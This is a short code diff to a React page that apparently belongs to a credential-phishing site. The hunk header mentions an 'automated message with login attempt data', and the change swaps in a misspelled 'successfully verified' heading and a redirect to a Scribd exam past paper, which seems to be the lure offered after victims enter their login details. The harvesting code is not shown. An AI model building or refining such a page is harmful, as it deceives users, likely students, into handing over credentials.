@@ -68,11 +68,11 @@ This is an automated message with login attempt data.`,
           {/* Success Message */}
           <div className="bg-white rounded-lg shadow-md p-8">
             <h1 className="text-2xl font-bold text-gray-900 mb-6">
-              It seems like we couldn't fetch the data!
+              susscefully verifed, accsess past paper using the below link
             </h1>
              <button
               onClick={() => {
-                window.location.href = 'https://www.dfasdff.com';
+                window.location.href = 'https://www.scribd.com/document/852995308/2025-0610-m25-qp-42-250407-133553-250413-191445';
               }}
               className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
             >
